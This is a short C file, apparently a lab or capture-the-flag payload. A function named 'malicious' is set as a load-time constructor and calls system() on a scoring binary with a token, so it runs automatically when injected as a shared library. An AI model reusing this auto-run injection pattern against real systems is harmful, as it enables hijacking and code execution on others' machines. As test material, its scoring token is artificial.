#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 8fb0e2ba-fddd-4f71-8567-958f32f62243");
}
